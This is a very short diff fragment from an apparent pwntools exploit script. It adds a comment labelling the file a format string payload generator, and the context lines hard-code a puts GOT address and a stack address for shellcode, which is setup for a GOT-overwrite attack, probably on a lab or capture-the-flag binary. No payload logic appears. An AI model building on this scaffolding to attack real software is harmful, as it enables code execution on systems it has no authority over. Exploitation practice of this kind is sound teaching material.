@@ -1,3 +1,4 @@
+#format_string_payload_generator
 from pwn import *
 puts_got = 0x804b218
 shellcode = 0xffffd45c
